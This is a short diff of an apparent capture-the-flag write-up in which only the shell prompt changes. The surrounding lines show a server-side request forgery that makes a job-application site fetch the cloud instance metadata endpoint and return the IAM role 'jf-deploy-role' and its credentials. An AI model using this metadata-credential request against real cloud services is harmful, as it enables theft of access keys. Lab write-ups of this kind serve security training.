@@ -16,7 +16,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials
 ```
 Result:
 ```
-jsw@io:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
+joergen@northpole:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
 jf-deploy-role
 ```
 
@@ -26,7 +26,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role
 ```
 
 ```
-jsw@io:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
+joergen@northpole:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
 ```
 ```json
 {
